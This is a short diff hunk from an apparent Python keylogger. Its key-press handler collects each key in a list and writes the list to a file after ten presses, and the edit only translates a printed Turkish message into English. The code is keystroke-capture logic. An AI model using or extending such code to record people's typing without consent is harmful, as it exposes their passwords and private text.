@@ -7,7 +7,7 @@ def on_press(key):
     global keys, count
     keys.append(key)
     count += 1 # count = count + 1
-    print("{0} tuşuna basıldı!".format(str(key)))
+    print("{0} key triggered".format(str(key)))
 
     if count >= 10:
         write_file(keys)
